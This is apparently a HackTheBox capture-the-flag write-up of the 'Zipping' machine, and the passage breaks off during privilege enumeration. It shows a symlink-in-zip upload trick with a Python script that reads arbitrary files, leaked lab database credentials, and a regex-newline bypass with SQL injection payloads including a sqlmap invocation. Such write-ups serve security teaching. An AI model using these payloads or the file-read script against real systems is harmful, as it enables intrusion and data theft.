HTB: Zipping
============

![Zipping](https://0xdf.gitlab.io/img/zipping-cover.png)

Zipping has a website with a function to upload resumes as PDF documents in a Zip archive. I’ll abuse this by putting symlinks into the zip and reading back files from the host file system. I’ll get the source for the site and find a filter bypass that allows SQL injection in another part of the site. I’ll use that injection to write a webshell, and include it exploiting a LFI
vulnerability to get execution. For root, I’ll abuse a custom binary with a malicious shared object. In Beyond Root, I’ll show two unintended foothold paths. The first arises from the differences between how PHP and 7z handle a file in a zip with a null byte in its name. The second uses the PHAR PHP filter to bypass the file\_exists check and execute a webshell from an archive.

## Box Info

Name[Zipping](https://www.hackthebox.com/machines/zipping) [![Zipping](https://0xdf.gitlab.io/icons/box-zipping.png)](https://www.hackthebox.com/machines/zipping)

[Play on HackTheBox](https://www.hackthebox.com/machines/zipping)Release Date[26 Aug 2023](https://twitter.com/hackthebox_eu/status/1694723766092496970)Retire Date13 Jan 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsMedium \[30\]Rated Difficulty![Rated difficulty for Zipping](https://0xdf.gitlab.io/img/zipping-diff.png)Radar Graph![Radar chart for Zipping](https://0xdf.gitlab.io/img/zipping-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:15:08 [![l1nvx](https://www.hackthebox.eu/badge/image/634163)](https://app.hackthebox.com/users/634163)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)01:12:27 [![Randominion](https://www.hackthebox.eu/badge/image/234175)](https://app.hackthebox.com/users/234175)

Creator[![xdann1](https://www.hackthebox.eu/badge/image/535069)](https://app.hackthebox.com/users/535069)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.229
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-08 15:15 EST
Nmap scan report for 10.10.11.229
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.44 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.229
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-08 15:19 EST
Nmap scan report for 10.10.11.229
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.53 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 23.04 lunar.

### Website - TCP 80

#### Site

The site is for a watch store:

![image-20240108152847100](https://0xdf.gitlab.io/img/image-20240108152847100.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

Most of the links to either to another spot on the page or are dead. There is a Contact form, but submitting it just sends a GET request without any of the form data, reloading the main page.

There are two links that go to another page. At the top right there’s a “Work with Us” button that leads to `/upload.php`:

![image-20240108153124639](https://0xdf.gitlab.io/img/image-20240108153124639.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

The upload capability says it accepts a zip file with a PDF inside.

Also in the nav bar is a link for “Shop”, which leads to `/shop`:

![image-20240108153950007](https://0xdf.gitlab.io/img/image-20240108153950007.png)

Clicking an individual item shows details:

![image-20240108154019582](https://0xdf.gitlab.io/img/image-20240108154019582.png)

I’m able to add to cart and place an order.

#### Tech Stack

I have a pretty good idea this is a PHP site at this point. Visiting `/index.php` loads the main page.

The HTTP response headers don’t say much besides Apache:

```
HTTP/1.1 200 OK
Date: Mon, 08 Jan 2024 20:28:11 GMT
Server: Apache/2.4.54 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 16738
Connection: close
Content-Type: text/html; charset=UTF-8

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://10.10.11.229 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.229
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      317l     1354w    16738c http://10.10.11.229/
301      GET        9l       28w      314c http://10.10.11.229/uploads => http://10.10.11.229/uploads/
301      GET        9l       28w      313c http://10.10.11.229/assets => http://10.10.11.229/assets/
301      GET        9l       28w      311c http://10.10.11.229/shop => http://10.10.11.229/shop/
200      GET      113l      380w     5322c http://10.10.11.229/upload.php
200      GET      317l     1354w    16738c http://10.10.11.229/index.php
301      GET        9l       28w      318c http://10.10.11.229/shop/assets => http://10.10.11.229/shop/assets/
500      GET        0l        0w        0c http://10.10.11.229/shop/home.php
500      GET        1l        0w        1c http://10.10.11.229/shop/cart.php
500      GET        0l        0w        0c http://10.10.11.229/shop/products.php
200      GET        1l        3w       15c http://10.10.11.229/shop/product.php
200      GET       68l      149w     2615c http://10.10.11.229/shop/index.php
200      GET        0l        0w        0c http://10.10.11.229/shop/functions.php
[####################] - 2m    150000/150000  0s      found:13      errors:1
[####################] - 2m     30000/30000   213/s   http://10.10.11.229/
[####################] - 2m     30000/30000   215/s   http://10.10.11.229/uploads/
[####################] - 0s     30000/30000   0/s     http://10.10.11.229/assets/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 2m     30000/30000   216/s   http://10.10.11.229/shop/
[####################] - 0s     30000/30000   0/s     http://10.10.11.229/shop/assets/ => Directory listing (remove --dont-extract-links to scan)

```

Nothing I didn’t know about at this point.

## Shell as rektsu

### Enumerate Upload

#### Intended Use

I’ll take a closer look at the file upload capability on the website. It wants a PDF inside a Zip, so I’ll make one:

```
oxdf@hacky$ zip sample.zip sample.pdf
  adding: sample.pdf (deflated 70%)
oxdf@hacky$ unzip -l sample.zip
Archive:  sample.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     3028  2017-02-24 12:42   sample.pdf
---------                     -------
     3028                     1 file

```

When I submit this, the page reloads with a message over the form:

![image-20240108173823959](https://0xdf.gitlab.io/img/image-20240108173823959.png)

The yellow text is a link to `/uploads/[md5 of zip]/[filename]`. Clicking it returns the same PDF uploaded.

#### Pushing Boundaries

If I change the contents of the archive, it changes the directory. If I try to include a second file, it says “Please include a single PDF file in the archive.” If I try to include something that doesn’t end in `.zip`, it says “The unzipped file must have a .pdf extension.”

If I try to upload a non-zip (say, a PNG), it says “Error uploading file.” Even if I take the valid `.zip` file and rename it to `.png`, when I upload it, the site returns the same “Error uploading file” error. So that error is likely based on extension.

It seems that the filtering is done by file extension. If I create a text file and name it `test.zip`, uploading that also returns “Error uploading file”.

### File Read

#### Manual

So how will the site handle a symbolic link with a `.pdf` extension? I’ll create one:

```
oxdf@hacky$ ln -s /etc/passwd passwd.pdf
oxdf@hacky$ ls -l passwd.pdf
lrwxrwxrwx 1 oxdf oxdf 11 Jan  8 18:07 passwd.pdf -> /etc/passwd
oxdf@hacky$ zip --symlinks passwd.zip passwd.pdf
  adding: passwd.pdf (stored 0%)
oxdf@hacky$ unzip -l passwd.zip
Archive:  passwd.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       11  2024-01-08 18:09   passwd.pdf
---------                     -------
       11                     1 file

```

It’s important to give `zip` the `--symlinks` argument, or else `zip` will follow the link and put a copy of my `/etc/passwd` into the archive.

It uploads just fine:

![image-20240108181524507](https://0xdf.gitlab.io/img/image-20240108181524507.png)

Clicking the link shows an empty PDF:

![image-20240108181023657](https://0xdf.gitlab.io/img/image-20240108181023657.png)

If I look in Burp, I’ll see that’s because the browser is trying to render a PDF, but the response isn’t a PDF:

![image-20240108181545476](https://0xdf.gitlab.io/img/image-20240108181545476.png)

That’s file read!

I’ll note the user on this box is rektsu, and there’s also a mysql user. In fact, I can make a payload that will return the user flag:

```
oxdf@hacky$ ln -s /home/rektsu/user.txt user.pdf
oxdf@hacky$ zip --symlinks user.zip user.pdf
  adding: user.pdf (stored 0%)

```

On viewing it:

```
HTTP/1.1 200 OK
Date: Mon, 08 Jan 2024 23:19:47 GMT
Server: Apache/2.4.54 (Ubuntu)
Last-Modified: Mon, 08 Jan 2024 23:19:46 GMT
ETag: "21-60e776efd7648"
Accept-Ranges: bytes
Content-Length: 33
Connection: close
Content-Type: application/pdf

ea9a4d59************************

```

#### Script

I’d like to make a script to make reading files from Zipping easier. I’ll walk through that in [this video](https://www.youtube.com/watch?v=NPlkZVm-C7M):

The final code is:

```
#!/usr/bin/env python3
import io
import re
import sys
import zipfile
import requests
from datetime import datetime

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <host> <target file path>")
    sys.exit()

host = sys.argv[1]
filepath = sys.argv[2]

zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, "w") as zip_file:
    zipInfo = zipfile.ZipInfo('resume.pdf')
    zipInfo.create_system = 3
    zipInfo.external_attr |= 0xA0000000
    zipInfo.date_time = datetime.now().timetuple()[:6]
    zip_file.writestr(zipInfo, filepath)

files = ('resume.zip', zip_buffer.getbuffer(), {"Content-Type": "application/zip"})
resp = requests.post(f'http://{host}/upload.php',
              files={"zipFile": ('resume.zip', zip_buffer.getbuffer(), {"Content-Type": "application/zip"})},
              data={"submit": ""}
              )

(url, ) = re.findall(r'path:</p><a href="(.*)">\1</a>', resp.text)

resp = requests.get(f'http://{host}/{url}')
sys.stdout.buffer.write(resp.content)

```

And it works (for both text and binaries):

```
oxdf@hacky$ python readfile.py 10.10.11.229 /etc/hostname
zipping

```

### Page Source

#### Find

I’m able to get the Apache config file for the site in the default location, `/etc/apache2/sites-enabled/000-default.conf`. Removing commented lines, it looks very standard:

```
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        <Directory /var/www/html/uploads>
                Options -Indexes
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

It is hosted out of `/var/www/html`, and disallows indexing on the `uploads` directory.

I’m able to read the page source using my script:

```
oxdf@hacky$ python readfile.py 10.10.11.229 /var/www/html/index.php
<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Start your development with Creative Design landing page.">
    <meta name="author" content="Devcrud">
    <title>Zipping | Watch store</title>

    <!-- font icons -->
    <link rel="stylesheet" href="assets/vendors/themify-icons/css/themify-icons.css">

    <!-- Bootstrap + Creative Design main styles -->
        <link rel="stylesheet" href="assets/css/creative-design.css">

</head>
<body data-spy="scroll" data-target=".navbar" data-offset="40" id="home">

    <!-- Page Navbar -->
    <nav id="scrollspy" class="navbar page-navbar navbar-light navbar-expand-md fixed-top" data-spy="affix" data-offset-top="20">
        <div class="container">
            <a class="navbar-brand" href="#"><strong class="text-primary">Zipping</strong> <span class="text-dark">Watch Store</span></a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="#home">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#features">Features</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#testmonial">Testmonial</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="shop">Shop</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#contact">Contact</a>
                    </li>
                    <li class="nav-item ml-md-4">
                        <a class="nav-link btn btn-primary" href="upload.php">Work with Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav><!-- End of Page Navbar -->

    <!-- Page Header -->
    <header id="home" class="header">
        <div class="overlay"></div>
        <div class="header-content">
            <h6>Watch Store</h6>
        </div>
    </header><!-- End of Page Header -->

    <!-- About Section -->
    <section id="about">
        <!-- Container -->
        <div class="container">
            <!-- About wrapper -->
            <div class="about-wrapper">
                <div class="after"><h1>About Us</h1></div>
                <div class="content">
                    <h5 class="title mb-3">Zipping Company</h5>
                    <!-- row -->
                    <div class="row">
                        <div class="col">
                            <p>Zipping Co. is a leading manufacturer of high-quality watches for men and women. Founded in 1980, the company has built a reputation for crafting timepieces that combine classic design with modern technology.</p>
                            <p><b>Innovation, Elegant, Sophisticated and Luxurious</b></p>
                            <p>Our watches are made with the finest materials, including stainless steel, leather, and sapphire crystal, and are powered by precision quartz and mechanical movements. We offer a wide range of styles, from sporty and casual to elegant and formal, ensuring that there is a watch for every occasion.</p>
                        </div>
                        <div class="col">
                            <p>One of the things that sets Zipping Co. apart is their commitment to innovation. We are constantly pushing the boundaries of what is possible with watch design, incorporating cutting-edge features like GPS, heart rate monitoring, and mobile connectivity into their products.</p>
                            <p>In addition to their regular collection, Zipping Co. also offers a line of limited edition watches, which are highly sought after by collectors and enthusiasts. These watches are crafted in small quantities and feature unique designs and materials.</p>
                        </div>
                    </div><!-- End of Row -->
                    <a href="javascript:void(0)">Read More...</a>
                </div>
            </div><!-- End of About Wrapper -->
        </div>  <!-- End of Container-->
     </section><!--End of Section -->

    <!-- section -->
    <section>
        <!-- Container -->
        <div class="container">
            <!-- row -->
            <div class="row justify-content-between align-items-center">
                <div class="col-md-6">
                    <div class="img-wrapper">
                        <div class="after"></div>
                        <img src="assets/imgs/service.jpg" class="w-100" alt="About Us">
                    </div>
                </div>
                <div class="col-md-5">
                    <h6 class="title mb-3">Customer Service</h6>
                    <p>Zipping Co. is dedicated to providing excellent customer service, and offers a two-year warranty on all of their watches. They also have a team of expert watchmakers who are available to repair and service any Zipping Co. watch.</p>
                    <p class="text-muted">The most important thing for us is you!</p>
                    <button class="btn btn-outline-primary btn-sm">Learn More</button>
                </div>
            </div>
            <!-- End of Row -->
        </div>
        <!-- End of Container -->
    </section><!-- End of Section -->

    <section>
        <!-- Container -->
        <div class="container">
            <!-- Row -->
            <div class="row justify-content-between align-items-center">
                <div class="col-md-5">
                    <h6 class="title mb-3">Business</h6>
                    <p>The future of Zipping Co. looks promising, with the company well-positioned to meet the changing needs and preferences of consumers in the smartwatch and customization market, as well as expanding to new markets.</p>
                    <p class="text-muted">We are open to new business offers, do not hesitate to contact us!</p>
                    <button class="btn btn-outline-primary btn-sm">Learn More</button>

                </div>
                <div class="col-md-6">
                    <div class="img-wrapper">
                        <div class="after right"></div>
                        <img src="assets/imgs/img-2.jpg" class="w-100" alt="About Us">
                    </div>
                </div>
            </div><!-- End of Row -->
        </div><!-- End of Container-->
    </section><!-- End of Section -->

    <!-- Features Section -->
    <section class="has-bg-img" id="features">
        <div class="overlay"></div>
        <!-- Button trigger modal -->
        <a data-toggle="modal" href="#exampleModalCenter">
            <i></i>
        </a>

        <!-- Modal -->
        <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                <div class="modal-content">
                </div>
            </div>
        </div><!-- End of Modal -->
    </section><!-- End of features Section -->

    <!-- Section -->
    <section>
        <!-- Container -->
        <div class="container">
            <!-- Row -->
            <div class="row justify-content-between align-items-center">
                <div class="col-md-6">
                    <div class="img-wrapper">
                        <div class="after"></div>
                        <img src="assets/imgs/img-3.jpg" class="w-100" alt="About us">
                    </div>
                </div>
                <div class="col-md-5">
                    <h6 class="title mb-3">Marketing Strategy</h6>

                    <p>We focus on emphasizing the high-quality and innovative features of our watches, leveraging customer reviews, creating a sense of exclusivity around limited edition watches and building a strong social media presence to connect with our customers and build relationships.</p>
                    <button class="btn btn-outline-primary btn-sm">Learn More</button>
                </div>
            </div><!-- End of Row -->
        </div><!-- End of Container-->
    </section><!-- End of Section -->

    <!-- Testmonial Section -->
    <section class="text-center pt-5" id="testmonial">
        <!-- Container -->
        <div class="container">
            <h3 class="mt-3 mb-5 pb-5">What our Client says</h3>
            <!-- Row -->
            <div class="row">
                <div class="col-sm-10 col-md-4 m-auto">
                    <div class="testmonial-wrapper">
                        <img src="assets/imgs/avatar1.jpg" alt="Client Image">
                        <h6 class="title mb-3">Adell Smith</h6>
                        <p>I recently purchased a watch from Zipping Co. and I couldn't be happier with my purchase. The watch is elegant and precision, and it's clear that it's been crafted with the finest materials. The customer service was also top-notch - they were very helpful in answering all of my questions and ensuring that I was completely satisfied with my purchase.</p>
                    </div>
                </div>
                <div class="col-sm-10 col-md-4 m-auto">
                    <div class="testmonial-wrapper">
                        <img src="assets/imgs/avatar2.jpg" alt="Client Image">
                        <h6 class="title mb-3">John Doe</h6>
                        <p>I am a collector of luxury watches, and Zipping Co.'s limited edition line is absolutely stunning. The designs are unique and sophisticated, and the quality is unmatched. I was also impressed with the warranty and repair service they offer, it gives me peace of mind knowing that my investment is protected. Highly recommended!</p>
                    </div>
                </div>
                <div class="col-sm-10 col-md-4 m-auto">
                    <div class="testmonial-wrapper">
                        <img src="assets/imgs/avatar3.jpg" alt="Client Image">
                        <h6 class="title mb-3">Kyle Butler</h6>
                        <p>I was looking for a watch that was both stylish and functional, and Zipping Co.'s collection definitely delivered. The watch I chose is luxurious and has all the features I was looking for, like GPS and heart rate monitoring. I highly recommend Zipping Co. to anyone looking for a high-quality, innovative watch and a great customer service.</p>
                    </div>
                </div>
            </div><!-- end of Row -->
        </div><!-- End of Cotanier -->
    </section><!-- End of Testmonial Section -->

    <!-- Section -->
    <section class="has-bg-img text-center text-light height-auto" style="background-image: url(/img/imgs/bg-img-2.jpg)">
        <h1 class="display-4">LET’S TALK BUSINESS.</h1>
    </section><!-- End of Section -->

    <!-- Contact Section -->
    <section id="contact" class="text-center">
        <!-- container -->
        <div class="container">
            <h1>CONTACT US</h1>
            <p class="mb-5">If you have some Questions or need Help! Please Contact Us! <br>
            We make Cool and Clean Design for your Watch</p>

            <!-- Contact form -->
            <form class="contact-form col-md-11 col-lg-9 mx-auto">
                <div class="form-row">
                    <div class="col form-group">
                        <input type="text" class="form-control" placeholder="Name">
                    </div>
                    <div class="col form-group">
                        <input type="email" class="form-control" placeholder="Email">
                    </div>
                </div>
                <div class="form-group">
                    <textarea name="" id="" cols="30" rows="5" class="form-control" placeholder="Your Message"></textarea>
                </div>
                <div class="form-group">
                    <input type="submit" class="btn btn-primary btn-block" value="Send Message">
                </div>
            </form><!-- End of Contact form -->
        </div><!-- End of Container-->
    </section><!-- End of Contact Section -->

    <!-- Section -->
    <section class="pb-0">
        <!-- Container -->
        <div class="container">
            <!-- Pre footer -->
            <div class="pre-footer">
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">ABOUT US</h6>
                    </li>
                    <li class="list-body">
                      <p>Zipping Co. is a company that is dedicated to producing high-quality watches that are both stylish and functional. We are constantly pushing the boundaries of what is possible with watch design and are known for their commitment to innovation and customer service.</p>
                      <a href="#"><strong class="text-primary">Zipping</strong> <span class="text-dark">Watch Store</span></a>
                    </li>
                </ul>
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">USEFUL LINKS</h6>
                    </li>
                    <li class="list-body">
                        <div class="row">
                            <div class="col">
                                <a href="#">Link 1</a>
                                <a href="#">Link 2</a>
                                <a href="#">Link 3</a>
                                <a href="#">Link 4</a>
                            </div>
                            <div class="col">
                                <a href="#">Link 5</a>
                                <a href="#">Link 6</a>
                                <a href="#">Link 7</a>
                                <a href="#">Link 8</a>
                            </div>
                        </div>
                    </li>
                </ul>
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">CONTACT INFO</h6>
                    </li>
                    <li class="list-body">
                        <p>Contact us and we'll get back to you within 24 hours.</p>
                        <p><i class="ti-location-pin"></i> 12345 Fake ST NoWhere AB Country</p>
                        <p><i class="ti-email"></i>  info@website.com</p>
                        <div class="social-links">
                            <a href="javascript:void(0)" class="link"><i class="ti-facebook"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-twitter-alt"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-google"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-pinterest-alt"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-instagram"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-rss"></i></a>
                        </div>
                    </li>
                </ul>
            </div><!-- End of Pre footer -->

            <!-- foooter -->
            <footer class="footer">
                <p>&copy; Zipping Watch Store</p>
            </footer><!-- End of Footer-->

        </div><!--End of Container -->
    </section><!-- End of Section -->

    <!-- core  -->
    <script src="assets/vendors/jquery/jquery-3.4.1.js"></script>
    <script src="assets/vendors/bootstrap/bootstrap.bundle.js"></script>

    <!-- bootstrap affix -->
    <script src="assets/vendors/bootstrap/bootstrap.affix.js"></script>

    <!-- Creative Design js -->
    <script src="assets/js/creative-design.js"></script>

</body>
</html>

```

#### Analysis

The intended path for Zipping now turns to the `shop` directory (though there is an unintended path via the zip upload that I’ll explore in [Beyond Root](#beyond-root---unintended-footholds)).

`index.php` is short:

```
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>

```

It brings in `functions.php` and calls `pdo_connect_mysql`, which isn’t a standard function, so it must be defined and imported. Then it includes the page defaulting to `home.php`. Including pages like this is a common PHP pattern, and one that can lead to local file include (LFI) vulnerabilities. Here there are two smart checks made that limit attacks:

1. It appends `.php` to the input. This means I can’t include files that don’t end in PHP.
2. It does a `file_exists` on the input plus `.php`, so using PHP filters won’t work.

Still, if I can get a PHP file onto Zipping in a known location, I would be able to execute it. I’ll keep that in mind (I’ll use this later for both the intended method as well as two unintended paths in [Beyond Root](#beyond-root---unintended-footholds).)

`functions.php` defines functions for a header and footer, as well as the MySQL connection:

```
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
}

```

I’ll note those creds. It’s also worth noting that the MySQL user is root, which implies it is likely to have more permissions on the DB.

`product.php` is interesting, specifically for how it interacts with the database at the top of the file:

```
<?php
// Check to make sure the id parameter is specified in the URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
        // Fetch the product from the database and return the result as an Array
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if (!$product) {
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }
} else {
    // Simple error to display if the id wasn't specified
    exit('No ID provided!');
}
?>

```

It’s using a dangerous method for interacting with the database, building a string with user input and passing it to `prepare`. It tries to mitigate for that with a regex looking for anything that’s not a digit 0-9, and just redirecting to `index.php` if found.

### SQLI

#### Bypass Filter

HackTricks has a page on PHP tricks, and one [section](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.) is about bypassing `preg_match` with `.*`. The issue is that `preg_match` only checks the first line of input for `.*`. So if I can start my input off with a newline, it won’t match. This is the example from the page:

```
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"

```

#### Zipping POC

I’ll see how this might work with the url `http://10.10.11.229/shop/index.php?page=product&id=3`. It shows a watch:

![image-20240109174814729](https://0xdf.gitlab.io/img/image-20240109174814729.png)

If I try `id=3 or select 1=1`, it redirects to the main page.

If I try `id=%0a3`, it loads just like normal:

![image-20240109174717972](https://0xdf.gitlab.io/img/image-20240109174717972.png)

That suggests that the newline is not messing it up. Building it a bit more towards SQLI, I’ll try injection to give it an ID that doesn’t exist (100) and then use injection to get something else there with `id=%0A100'+or+'1'='1`. This loads the page with the first watch:

![image-20240109175251243](https://0xdf.gitlab.io/img/image-20240109175251243.png)

That’s successful SQL injection!

In the injection above, I just let the intended `'` close out the injection. The site is doing:

```
SELECT * FROM products WHERE id = '$id'

```

So when I send `%0A100'+or+'1'='1`, that makes:

```
SELECT * FROM products WHERE id = '%0A100'+or+'1'='1'

```

If I want to do something like UNION injection, I’ll need to “use up” that trailing `'`. Typically, I would send `id=%0A100'--+-`, but that results in a redirect back to the index. Why? A bit closer look at the filtering regex is required:

```
^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$

```

Because no parentheses are used, this is effectively two distinct regex:

```
^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]
[^0-9]$

```

So it matches if either of the following are true:

- It starts with anything and then ends with any of the listed characters.
- It ends with a non-digit, because `[]` says look for any of the characters given (in this case 0-9), but `^` inside `[]` means look for any character not give (so anything by 0-9).

If not for the newline injection that bypasses the first, these two would be pretty close to equivalent. When I bypass the first with `%0A100'+or+'1'='1`, it also is ok on the second because it ends with digit.

Conveniently, I’m trying to add a comment to the end. That means that anything after the comment marker is also just comment, so I can easily add a digit. Sending `id=%0A100'--+-1` doesn’t redirect, but returns “Product does not exist!”, the same as just `id=100`, which means the comment works.

It’s worth noting that starting a regex string with `^.*` is basically the same as replacing that with nothing. Must be at the start but then after 0 or more of anything is back to the default. Except that it allows this to be exploited. Still, regex is a confusing enough thing that I’ve seen lots of this pattern in the real world, so I don’t think it’s fair to call this part unrealistic.

#### UNION Injection

I’ll use UNION injection to read the database. I can start with `id=%0A100'+union+select+1;--+-1`. This returns an empty page, which probably represents some kind of SQL error. I expect this, as it would only work if the queried table only have one column. I’ll start checking other lengths until I get to 8, where it returns:

![image-20240110102001914](https://0xdf.gitlab.io/img/image-20240110102001914.png)

Comparing this to the page (and looking at the raw HTML), I can assert that the products table probably has the following columns:

1. Likely ID (not shown on page)
2. Product Name
3. Features paragraph
4. Sale price
5. Regular price
6. Max number allowed to add to cart
7. Image name
8. unknown

I can enumerate the rest of the database, but there’s not much interesting in it.

#### sqlmap

All of this SQL injection can be automated using `sqlmap`. I’ll need to use the `--prefix` and `--suffix` parameters to add the leading newline and the trailing digit, and it needs at least `--level 2` to find it:

```
oxdf@hacky$ sqlmap -u "http://10.10.11.229/shop/?page=product&id=1" --prefix "%0A%0D'" --suffix="'-- -1" -p id --batch --level 2
...[snip]...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 162 HTTP(s) requests:
---
Parameter: id (GET)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: page=product&id=1
';SELECT SLEEP(5)'-- -1
---
[09:14:55] [INFO] the back-end DBMS is MySQL
...[snip]...

```

It is interesting that it finds a stacked queries attack, rather than union injection. This is a blind technique and will run very slowly.

### Shell

#### Enumerate Permissions

I noted [above](#analysis) that the application is connecting to MySQL as the root user. It’s worth checking for what permissions that user has. Privileges are stored in the `information_schema.user_privileges` table, so I’ll inject with `id=%0A100'+union+select+1,2,group_concat(grantee, ':', privilege_type),4,5,2,7,8+from+information_schema.user_privileges;--+-1`:

![image-20240110103954519](https://0xdf.gitlab.io/img/image-20240110103954519.png)

It’s a bit hard to read in that screenshot, but one privilege jumps out:

The [FILE](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file) privilege:

> Affects the following operations and server behaviors:
>
